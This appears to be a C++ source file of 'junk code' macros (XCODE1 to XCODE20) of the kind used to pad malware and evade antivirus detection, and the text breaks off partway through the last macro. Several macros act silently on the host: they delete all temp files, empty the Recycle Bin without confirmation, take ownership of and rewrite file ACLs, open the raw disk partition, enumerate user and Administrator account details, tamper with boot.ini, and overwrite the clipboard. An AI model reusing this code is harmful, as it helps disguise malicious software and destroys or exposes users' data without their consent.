#include "stdafx.h"
#include "md5.h"
#include "nb30.h"
#define NO_SHLWAPI_STRFCNS
#include <strsafe.h>

#pragma  comment(lib, "wininet")
#pragma  comment(lib, "urlmon")
#pragma  comment(lib, "ws2_32")
#pragma  comment(lib, "Netapi32")
#pragma  comment(lib, "shlwapi.lib")
#pragma  comment(lib, "strsafe.lib")
#pragma  comment(lib, "version")

#define FLOWERX

#define OUTSTR TRACE//OutputDebugString
using namespace std;

#define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)

char *buf = NULL,*buf1;
DWORD dwSizeXXX = MAX_PATH,dwBytesInBlock;
char szXBuff[MAX_PATH] = {0};
HANDLE hXMod = INVALID_HANDLE_VALUE;
HANDLE hmyfile,hFileMapping,hmyfilemap;
char TmpBuf[512];
MD5_CTX md5T;
unsigned char digest[16];
int PasswdLen=0;
TOKEN_PRIVILEGES tp = { 0 }; 
LUID luid; 
DWORD cb=sizeof(TOKEN_PRIVILEGES);
BOOL bRetval = FALSE;
HANDLE hToken = NULL; 
PSID pSIDAdmin = NULL;
PSID pSIDEveryone = NULL;
PACL pACL = NULL;
int NUM_ACES  = 2;
EXPLICIT_ACCESS ea[2];
SID_IDENTIFIER_AUTHORITY SIDAuthWorld	= SECURITY_WORLD_SID_AUTHORITY;
SID_IDENTIFIER_AUTHORITY SIDAuthNT		= SECURITY_NT_AUTHORITY;
DWORD dwRes;
WIN32_FIND_DATA findData;
DWORD  dwPort     = 0;
CRITICAL_SECTION lock;
string evename = "CmdShell";
HWND hwnd;
MSG msg;
HRSRC hSrc;
HGLOBAL hGlobal;
LPVOID lp;
FILE *fd;
SYSTEM_INFO sinf;
__int64 qwFileSize,myFilesize,qwFileOffset,qwmyFileOffset;
PBYTE pbFile,pbmyFile;
HKEY hKey;
char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
OSVERSIONINFOEX osvi;
SHQUERYRBINFO shqbi;
LPUSER_INFO_0 pBuf = NULL;
LPUSER_INFO_0 pTmpBuf;
DWORD dwLevel = 0;
DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
DWORD dwEntriesRead = 0;
DWORD dwTotalEntries = 0;
DWORD dwResumeHandle = 0;
DWORD dwTotalCount = 0;
NET_API_STATUS nStatus;
STARTUPINFO si;
PROCESS_INFORMATION pi;
SECURITY_ATTRIBUTES sa;
HBITMAP	hBitmap;
HBITMAP *hDib;
POINT pt;
std::vector<double> aaa;
std::vector<double>::const_iterator iii;
NCB Ncb;
UCHAR uRetCode;
LANA_ENUM lenum;
int i;
char szDrive[3] = " :";
typedef struct _ASTAT_{
    ADAPTER_STATUS adapt;
    NAME_BUFFER NameBuff[ 30 ];
}ASTAT,*PASTAT;
ASTAT Adapter;
LARGE_INTEGER count_freq;
MEMORYSTATUS MemStat;
wchar_t *pwText;
typedef struct tagLANGANDCP
{
	WORD wLanguage;
	WORD wCodePage;
} LANGANDCP;
LANGANDCP FAR  *lpBuffer;
WNDPROC wpOrigEditProc;
FILETIME ft;
SYSTEMTIME st;
LPTSTR lpszVariable;
LPTCH lpvEnv;
LARGE_INTEGER liDueTime;

LPUSER_INFO_1 pBuf1 = NULL;
LPUSER_INFO_2 pBuf2 = NULL;
LPUSER_INFO_3 pBuf3 = NULL;
LPUSER_INFO_4 pBuf4 = NULL;
LPUSER_INFO_10 pBuf10 = NULL;
LPUSER_INFO_11 pBuf11 = NULL;
LPUSER_INFO_20 pBuf20 = NULL;
LPUSER_INFO_23 pBuf23 = NULL;
ITaskScheduler * pITaskScheduler = 0;
ITask * pITask = 0;
ITaskTrigger * pITaskTrigger = 0;
HRESULT hr;
LPWSTR ppwszComputer;
WORD iNewTrigger;
TASK_TRIGGER trigger;
COORD dwCursorPostion;
CONSOLE_SCREEN_BUFFER_INFO *lpConsoleScreenBufferInfo;
CRITICAL_SECTION	g_CriticalSection;
PROCESSENTRY32 procentry;
FILETIME    datetime,local_filetime;
UINT uDropEffect;
DROPFILES dropFiles;
UINT uGblLen,uDropFilesLen;
HGLOBAL hGblFiles,hGblEffect;
DWORD *dwDropEffect;
SC_HANDLE scm;
SC_HANDLE service;
SERVICE_STATUS status;
CBitmap *pbm;
BITMAP bm = {0};
HBITMAP hbm;
HDC hdc;
HPEN hOldPen,hPen;
RECT prcOld;
HICON hIcon;
typedef struct
{
    DWORD   dwUnknown1;
    ULONG   uKeMaximumIncrement;
    ULONG   uPageSize;
    ULONG   uMmNumberOfPhysicalPages;
    ULONG   uMmLowestPhysicalPage;
    ULONG   uMmHighestPhysicalPage;
    ULONG   uAllocationGranularity;
    PVOID   pLowestUserAddress;
    PVOID   pMmHighestUserAddress;
    ULONG   uKeActiveProcessors;
    BYTE    bKeNumberProcessors;
    BYTE    bUnknown2;
    WORD    wUnknown3;
} SYSTEM_BASIC_INFORMATION;

typedef struct
{
    LARGE_INTEGER   liIdleTime;
    DWORD           dwSpare[76];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
    LARGE_INTEGER liKeBootTime;
    LARGE_INTEGER liKeSystemTime;
    LARGE_INTEGER liExpTimeZoneBias;
    ULONG         uCurrentTimeZoneId;
    DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;
SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
SYSTEM_TIME_INFORMATION        SysTimeInfo;
SYSTEM_BASIC_INFORMATION       SysBaseInfo;
typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
PROCNTQSI NtQuerySystemInformation;
typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
typedef struct {
	DWORD dwPID;
	PROCENUMPROC lpProc;
	DWORD lParam;
	BOOL bEnd;
} EnumInfoStruct;
HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD, DWORD);
BOOL (WINAPI *lpfProcess32First)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfProcess32Next)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfEnumProcesses)(DWORD *, DWORD, DWORD *);
BOOL (WINAPI *lpfEnumProcessModules)(HANDLE, HMODULE *, DWORD,LPDWORD);
DWORD (WINAPI *lpfGetModuleBaseName)(HANDLE, HMODULE, LPTSTR, DWORD);
INT (WINAPI *lpfVDMEnumTaskWOWEx)(DWORD, TASKENUMPROCEX, LPARAM);

BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, PSZ pszFileName, LPARAM lpUserDefined) {
	BOOL bRet=TRUE;
	EnumInfoStruct *psInfo = (EnumInfoStruct *)lpUserDefined;
	if (!bRet)
		psInfo->bEnd = TRUE;
	return !bRet;
}

#define XCODE1 try {OUTSTR("1");\
		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		if (INVALID_HANDLE_VALUE != hXMod)\
		{\
			dwSizeXXX = GetFileSize(hXMod, NULL);\
			buf = (char *)malloc(dwSizeXXX);\
			if (buf!=NULL)\
			{\
				ReadFile(hXMod, buf, dwSizeXXX, &dwSizeXXX, NULL);\
				CloseHandle(hXMod);\
				if (buf[dwSizeXXX-0x20]=='A')\
				{\
					dwSizeXXX=GetTickCount();\
				}\
			}\
		}\
	}\
	catch(...) {\
	Sleep(1);\
	}

#define XCODE2 try {OUTSTR("2");\
	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
	PasswdLen = strlen(szXBuff);\
	memcpy(TmpBuf + 0x00, "\x7F", 1);\
	memcpy(TmpBuf + 0x01, szXBuff, PasswdLen);\
	memcpy(TmpBuf + 0x01 + PasswdLen, "1234567890ABCDEF", 16);\
	md5T.MD5Update((unsigned char*)TmpBuf, 17 + PasswdLen);\
	md5T.MD5Final(digest);\
	memcpy(szXBuff, digest, 16);\
	}\
	catch(...) {\
	Sleep(2);\
	}

#define XCODE3 try {OUTSTR("3");\
	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
	if (hXMod != INVALID_HANDLE_VALUE)\
	{\
		OUTSTR("open device success");\
		dwRes = inet_addr("192.168.1.203");\
		DeviceIoControl(hXMod, IOCTL_BEEP_SET_PROTECT_FILE, szXBuff, sizeof(szXBuff), NULL, 0, &dwRes, NULL);\
		CloseHandle(hXMod);\
	}\
	}\
		catch(...) {\
		Sleep(3);\
	}

#define XCODE4 try {OUTSTR("4");\
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
	{\
		;\
	}\
	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) \
	{\
		;\
	}\
	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));\
	ea[0].grfAccessPermissions = GENERIC_READ;\
	ea[0].grfAccessMode = SET_ACCESS;\
	ea[0].grfInheritance = NO_INHERITANCE;\
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;\
	ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;\
	ea[1].grfAccessPermissions = GENERIC_ALL;\
	ea[1].grfAccessMode = SET_ACCESS;\
	ea[1].grfInheritance = NO_INHERITANCE;\
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;\
	ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;\
	if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))\
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (ERROR_SUCCESS == dwRes) \
	{\
		bRetval = TRUE;\
		;\
	}\
	if (dwRes != ERROR_ACCESS_DENIED)\
	{\
		;\
	}\
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) \
	{\
		; \
	} \
	if(LookupPrivilegeValue( NULL, SE_TAKE_OWNERSHIP_NAME, &luid ))\
	{\
		tp.PrivilegeCount = 1; \
		tp.Privileges[0].Luid = luid; \
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\
		AdjustTokenPrivileges( hToken, FALSE, &tp, cb, NULL, NULL );\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL); \
	if (dwRes != ERROR_SUCCESS) \
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (dwRes == ERROR_SUCCESS)\
	{\
		bRetval = TRUE; \
	}\
	if (pSIDAdmin)\
		FreeSid(pSIDAdmin); \
	if (pSIDEveryone)\
		FreeSid(pSIDEveryone); \
	if (pACL)\
		LocalFree(pACL);\
	if (hToken)\
		CloseHandle(hToken);\
	}\
		catch(...) {\
		Sleep(4);\
	}

#define XCODE5 try {OUTSTR("5");\
	GetTempPath(64, TmpBuf);\
	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
	DeleteUrlCacheEntry (szXBuff);\
	strcat(TmpBuf, "dtapp.bat");\
	if (0)\
	{\
		fd=fopen(TmpBuf, "r");\
		fread(szXBuff, MAX_PATH, 1, fd);\
		fclose(fd);\
	}\
	else\
	{\
		WinExec("cmd /c dir", SW_HIDE);\
	}\
	}\
	catch(...) {\
	Sleep(5);\
	}

#define XCODE6 try {OUTSTR("6");\
	GetTempPath(MAX_PATH, szXBuff);\
	SetCurrentDirectory(szXBuff);\
	hXMod = FindFirstFile(szXBuff, &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
		{\
			GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
			DeleteFile(szXBuff);\
		}\
		while (FindNextFile(hXMod, &findData) != 0)\
		{\
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
			{\
				GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
				DeleteFile(szXBuff);\
			}\
		}\
		FindClose(hXMod);\
	}\
	hXMod = FindFirstFile("*", &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
		{\
			if (findData.cFileName[0] != '.')\
			{\
				SetCurrentDirectory(findData.cFileName);\
			}\
		}\
		while (FindNextFile(hXMod, &findData) != '\x0')\
		{\
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
			{\
				if (findData.cFileName[0] != '.')\
				{\
					SetCurrentDirectory(findData.cFileName);\
				}\
			}\
		}\
		FindClose(hXMod);\
	}\
	}\
	catch(...) {\
	Sleep(6);\
	}

#define XCODE7 try {OUTSTR("7");\
	setlocale(LC_ALL,"chs");\
	InitializeCriticalSection(&lock);\
	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
	hwnd = GetActiveWindow();\
	SetWindowText(hwnd,"Waiting for client connect.....");\
	PeekMessage(&msg,NULL,0,0,PM_NOREMOVE);\
	hXMod = OpenEvent(EVENT_ALL_ACCESS,TRUE,"CMD_EVENT");\
	if (NULL != hXMod)\
	{\
		if(SetEvent(hXMod))\
		{\
			while(TRUE)\
			{\
				if(PeekMessage(&msg,NULL,0,0,PM_REMOVE))\
				{\
					if (msg.message == 5)\
					{\
						dwSizeXXX = msg.wParam;\
						sprintf(szXBuff, "%d", dwSizeXXX);\
						SetWindowText(hwnd,szXBuff);\
						break;\
					}\
				}\
			}\
			evename += szXBuff;\
			hXMod=CreateEvent(NULL,FALSE,FALSE,evename.c_str());\
		}\
	}\
	}\
	catch(...) {\
	Sleep(7);\
	}

#define XCODE8 try {OUTSTR("8");\
	GetTempPath(64, TmpBuf);\
	strcat(TmpBuf, "dtapp.exe");\
	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDD_BUNDLE2_DIALOG), "EXE");\
	hGlobal = LoadResource(NULL,hSrc);\
	lp = LockResource(hGlobal);\
	dwSizeXXX = SizeofResource(NULL,hSrc);\
	ofstream ofs(TmpBuf,ios::binary);\
	ofs.write((char*)lp,4);\
	ofs.close();\
	FreeResource(hGlobal);\
	}\
	catch(...) {\
	Sleep(8);\
	}

#define XCODE9 try {OUTSTR("9");\
	GetSystemInfo(&sinf);\
	hXMod = CreateFile(".\\first.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);\
	hmyfile =CreateFile("c:\\second.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\
	hFileMapping = CreateFileMapping(hXMod, NULL,PAGE_READONLY, 0, 0, NULL);\
	qwFileSize = GetFileSize(hXMod, &dwSizeXXX);\
	qwFileSize += (((__int64) dwSizeXXX) << 32);\
	myFilesize=qwFileSize+sinf.dwAllocationGranularity;\
	hmyfilemap = CreateFileMapping(hmyfile, NULL, PAGE_READWRITE,(DWORD)(myFilesize>>32), (DWORD)(myFilesize& 0xFFFFFFFF), NULL);\
	CloseHandle(hXMod);\
	CloseHandle(hmyfile);\
	pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE, 0, 0, sizeof(AddMsg));\
	memcpy(pbmyFile,AddMsg,sizeof(AddMsg));\
	UnmapViewOfFile(pbmyFile);\
	qwFileOffset = 0;\
	qwmyFileOffset=sinf.dwAllocationGranularity;\
	while (qwFileSize > 0)\
	{\
		dwBytesInBlock = sinf.dwAllocationGranularity;\
		if(qwFileSize < sinf.dwAllocationGranularity)\
			dwBytesInBlock =(DWORD) qwFileSize;\
		pbFile = (PBYTE) MapViewOfFile(hFileMapping, FILE_MAP_READ,(DWORD)(qwFileOffset >> 32),(DWORD)(qwFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE,(DWORD)(qwmyFileOffset >> 32),(DWORD)(qwmyFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		memcpy(pbmyFile,pbFile,dwBytesInBlock);\
		UnmapViewOfFile(pbFile);\
		UnmapViewOfFile(pbmyFile);\
		qwmyFileOffset+=dwBytesInBlock;\
		qwFileOffset += dwBytesInBlock;\
		qwFileSize -= dwBytesInBlock;\
	}\
	CloseHandle(hFileMapping);\
	CloseHandle(hmyfilemap);\
	}\
	catch(...) {\
	Sleep(9);\
	}

#define XCODE10 try {OUTSTR("10");\
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
	{\
		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);\
		GetVersionEx((OSVERSIONINFO *)&osvi);\
	}\
	dwRes = RegOpenKeyEx( HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ProductOptions",0, KEY_QUERY_VALUE, &hKey );\
	if( dwRes == ERROR_SUCCESS )\
	{\
	RegQueryValueEx( hKey, "ProductType", NULL, NULL, (LPBYTE) szXBuff, &dwSizeXXX);\
	RegCloseKey( hKey );\
	if ( lstrcmpi( "WINNT", szXBuff) == 0 )\
	OUTSTR("Workstation");\
	if ( lstrcmpi( "LANMANNT", szXBuff) == 0 )\
	OUTSTR( "Server " );\
	if ( lstrcmpi( "SERVERNT", szXBuff) == 0 )\
	OUTSTR( "Advanced Server " );\
	sprintf(szXBuff,"%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion );\
	OUTSTR(szXBuff);\
	}\
	}\
	catch(...) {\
		Sleep(10);\
	}

#define XCODE11 try {OUTSTR("11");\
	shqbi.cbSize = sizeof(shqbi);\
	shqbi.i64NumItems = -1;\
	shqbi.i64Size = -1;\
	if(S_OK == SHQueryRecycleBin(0, &shqbi))\
	{\
		sprintf(szXBuff, "Items:%u Bytes used:%u", (DWORD)shqbi.i64NumItems, (DWORD)shqbi.i64Size);\
		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI|SHERB_NOCONFIRMATION);\
	}\
	}\
	catch(...) {\
		Sleep(11);\
	}


#define XCODE12 try {OUTSTR("12");\
do {\
	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
	   {\
		   if ((pTmpBuf = pBuf) != NULL)\
		   {\
			   for (dwRes = 0; (dwRes < dwEntriesRead); dwRes++)\
			   {\
				   if (pTmpBuf == NULL)\
				   {\
					   fprintf(stderr, "An access violation has occurred\n");\
					   break;\
				   }\
				   wprintf(L"\t-- %s\n", pTmpBuf->usri0_name);\
				   pTmpBuf++;\
				   dwTotalCount++;\
			   }\
		   }\
	   }\
	   else\
		   fprintf(stderr, "A system error has occurred: %d\n", nStatus);\
	   if (pBuf != NULL)\
	   {\
		   NetApiBufferFree(pBuf);\
		   pBuf = NULL;\
	   }\
   }\
   while (nStatus == ERROR_MORE_DATA);\
   if (pBuf != NULL)\
	   NetApiBufferFree(pBuf);\
   fprintf(stderr, "\nTotal of %d entries enumerated\n", dwTotalCount);\
	}\
		catch(...) {\
		Sleep(12);\
	}

#define XCODE13 try {OUTSTR("13");\
		PasswdLen=0;\
		while (PasswdLen < 24) {\
		dwLevel = PasswdLen;\
		nStatus = NetUserGetInfo(L"localhost", L"Administrator", dwLevel, (LPBYTE *) & pBuf);\
		if (nStatus == NERR_Success) {\
			if (pBuf != NULL) {\
				switch (PasswdLen) {\
				case 0:\
					wprintf(L"\tUser account name: %s\n", pBuf->usri0_name);\
					break;\
				case 1:\
					pBuf1 = (LPUSER_INFO_1) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf1->usri1_name);\
					break;\
				case 2:\
					pBuf2 = (LPUSER_INFO_2) pBuf;\
					wprintf(L"\tPrivilege level: %d\n", pBuf2->usri2_priv);\
					break;\
				case 4:\
					pBuf4 = (LPUSER_INFO_4) pBuf;\
					wprintf(L"\tHome directory: %s\n", pBuf4->usri4_home_dir);\
					break;\
				case 10:\
					pBuf10 = (LPUSER_INFO_10) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf10->usri10_name);\
					wprintf(L"\tFull name: %s\n", pBuf10->usri10_full_name);\
					break;\
				case 11:\
					pBuf11 = (LPUSER_INFO_11) pBuf;\
					wprintf(L"\tAuth flags: %x\n", pBuf11->usri11_auth_flags);\
					break;\
				case 20:\
					pBuf20 = (LPUSER_INFO_20) pBuf;\
					wprintf(L"\tFlags (in hex): %x\n", pBuf20->usri20_flags);\
					break;\
				case 23:\
					pBuf23 = (LPUSER_INFO_23) pBuf;\
					wprintf(L"\tComment: %s\n", pBuf23->usri23_comment);\
					break;\
				default:\
					break;\
				}\
			}\
		}\
		else\
			fprintf(stderr, "NetUserGetinfo failed with error: %d\n", nStatus);\
		if (pBuf != NULL)\
			NetApiBufferFree(pBuf);\
		switch (PasswdLen){\
		case 0:\
		case 1:\
		case 10:\
			PasswdLen++;\
			break;\
		case 2:\
			PasswdLen = 4;\
			break;\
		case 4:\
			PasswdLen = 10;\
			break;\
		case 11:\
			PasswdLen = 20;\
			break;\
		case 20:\
			PasswdLen = 23;\
			break;\
		default:\
			PasswdLen = 24;\
			break;\
		}\
	}\
	}\
		catch(...) {\
		Sleep(13);\
	}

#define XCODE14 try {OUTSTR("14");\
    CoInitialize( 0 );\
        hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
        pITaskScheduler->GetTargetComputer( &ppwszComputer );\
        _tprintf( _T("Target computer: %s\n"), ppwszComputer );\
        CoTaskMemFree( ppwszComputer );\
        hr = pITaskScheduler->NewWorkItem(L"MyHappyWorkItem",CLSID_CTask,IID_ITask,(LPUNKNOWN *)&pITask );\
        hr = pITask->SetApplicationName( L"CALC.EXE" ); \
        hr = pITask->CreateTrigger( &iNewTrigger, &pITaskTrigger );\
        pITaskTrigger->GetTrigger( &trigger );\
        trigger.wStartMinute++;\
        pITaskTrigger->SetTrigger( &trigger );\
        pITaskScheduler->Delete( L"MyHappyWorkItem" );\
    }\
    catch(...) \
    {\
        if ( pITaskTrigger )\
            pITaskTrigger->Release();\
        if ( pITask )\
            pITask->Release();\
        if ( pITaskScheduler )\
            pITaskScheduler->Release();\
			CoUninitialize();\
			Sleep(14);\
    }

#define XCODE15 try {OUTSTR("15");\
	srand(time(0));\
	InitializeCriticalSection(&g_CriticalSection);\
	hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
	if(hXMod!=INVALID_HANDLE_VALUE){\
		SetConsoleTitle(AddMsg);\
		EnterCriticalSection(&g_CriticalSection);\
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
		SetConsoleTextAttribute(hXMod,10);\
		SetConsoleTextAttribute(hXMod,12);\
		lpConsoleScreenBufferInfo=new CONSOLE_SCREEN_BUFFER_INFO;\
		GetConsoleScreenBufferInfo(hXMod,lpConsoleScreenBufferInfo);\
		dwCursorPostion.X=lpConsoleScreenBufferInfo->dwCursorPosition.X-1;\
		dwCursorPostion.Y=lpConsoleScreenBufferInfo->dwCursorPosition.Y;\
		SetConsoleCursorPosition(hXMod,dwCursorPostion);\
		FillConsoleOutputCharacter(hXMod,' ',1,dwCursorPostion,&dwRes);\
		delete lpConsoleScreenBufferInfo;\
	}\
    }\
	catch(...) \
    {\
		LeaveCriticalSection(&g_CriticalSection);\
		delete lpConsoleScreenBufferInfo;\
		CloseHandle(hXMod);\
		Sleep(15);\
    }

#define XCODE16 try {OUTSTR("16");\
		hXMod = LoadLibraryA("Kernel32.DLL");\
		if (hXMod == NULL)\
			throw 1;\
		hmyfile = LoadLibraryA("VDMDBG.DLL");\
		if (hmyfile == NULL)\
			throw 1;\
		lpfCreateToolhelp32Snapshot =(HANDLE (WINAPI *)(DWORD,DWORD))GetProcAddress((HMODULE)hXMod, "CreateToolhelp32Snapshot");\
		lpfProcess32First =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32First");\
		lpfProcess32Next =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32Next");\
		if (lpfProcess32Next == NULL|| lpfProcess32First == NULL|| lpfCreateToolhelp32Snapshot == NULL)\
			throw 1;\
		lpfVDMEnumTaskWOWEx = (INT (WINAPI *)(DWORD, TASKENUMPROCEX,LPARAM)) GetProcAddress((HMODULE)hmyfile, "VDMEnumTaskWOWEx");\
		if (lpfVDMEnumTaskWOWEx == NULL)\
			throw 1;\
		hFileMapping = lpfCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
		if (hFileMapping == INVALID_HANDLE_VALUE) {\
			throw 1;\
		}\
		procentry.dwSize = sizeof(PROCESSENTRY32);\
		bRetval = lpfProcess32First(hFileMapping, &procentry);\
		EnumInfoStruct *sInfo=new EnumInfoStruct;\
		while (bRetval) {\
				if (_stricmp(procentry.szExeFile, "NTVDM.EXE") == 0) {\
					sInfo->dwPID = procentry.th32ProcessID;\
					sInfo->bEnd = FALSE;\
					lpfVDMEnumTaskWOWEx(procentry.th32ProcessID,(TASKENUMPROCEX) Enum16, (LPARAM) &sInfo);\
					if (sInfo->bEnd)\
						break;\
				}\
				procentry.dwSize = sizeof(PROCESSENTRY32);\
				bRetval = lpfProcess32Next(hFileMapping, &procentry);\
		}\
		delete sInfo;\
		}\
		catch(...)  {\
			if (hXMod)\
				FreeLibrary((HMODULE)hXMod);\
			if (hmyfile)\
				FreeLibrary((HMODULE)hmyfile);\
			Sleep(16);\
		}

#define XCODE17 try {OUTSTR("17");\
			GetWindowsDirectory(szXBuff, MAX_PATH);\
			szXBuff[3]=0;\
			strcat(szXBuff, "boot.ini");\
            hXMod = CreateFile(szXBuff,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
            if (hXMod != INVALID_HANDLE_VALUE)\
            {\
				GetFileTime(hXMod, &datetime, &datetime, &datetime);\
				datetime.dwHighDateTime++;\
				datetime.dwLowDateTime++;\
                if (TRUE == LocalFileTimeToFileTime(&datetime,&local_filetime))\
                {\
                    SetFileTime(hXMod,&local_filetime,NULL,&local_filetime);\
                }\
				dwRes=GetFileAttributes(szXBuff);\
				dwRes&=(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);\
				SetFileAttributes(szXBuff,dwRes);\
             }\
			 CloseHandle(hXMod);\
		}\
		catch(...) {\
			Sleep(17);\
		}

#define XCODE18 try {OUTSTR("18");\
			GetModuleFileName(NULL,szXBuff,MAX_PATH);\
			(strrchr(szXBuff,'\\'))[1] = 0;\
			GetTempPath(MAX_PATH, szXBuff);\
			strcat(szXBuff,"config.ini");\
			WritePrivateProfileString("netconf","str",AddMsg,szXBuff);\
			GetPrivateProfileString("netconf","code",NULL,TmpBuf,64,szXBuff);\
		}\
			catch(...) {\
			Sleep(18);\
		}

#define XCODE19 try {OUTSTR("19");\
		uDropEffect=RegisterClipboardFormat(AddMsg);\
		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
		*dwDropEffect=DROPEFFECT_COPY;\
		GlobalUnlock(hGblEffect);\
		uDropFilesLen=sizeof(DROPFILES);\
		dropFiles.pFiles =uDropFilesLen;\
		dropFiles.pt.x=0;\
		dropFiles.pt.y=0;\
		dropFiles.fNC =FALSE;\
		dropFiles.fWide =TRUE;\
		uGblLen=uDropFilesLen+dwSizeXXX*2+8;\
		hGblFiles= GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE, uGblLen);\
		buf=(char*)GlobalLock(hGblFiles);\
		memcpy(buf,(LPVOID)(&dropFiles),uDropFilesLen);\
		buf=buf+uDropFilesLen;\
		MultiByteToWideChar(CP_ACP,MB_COMPOSITE,buf,MAX_PATH,(WCHAR *)buf,MAX_PATH);\
		GlobalUnlock(hGblFiles);\
		if( OpenClipboard(NULL) )\
		{\
			EmptyClipboard();\
			SetClipboardData(CF_HDROP, hGblFiles);\
			SetClipboardData(uDropEffect,hGblEffect);\
			CloseClipboard();\
		}\
		GlobalFree(hGblEffect);\
		GlobalFree(hGblFiles);\
	}\
		catch(...) {\
		Sleep(19);\
	}

#define XCODE20 try {OUTSTR("20");\
		RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE",0,KEY_READ,&hKey);\
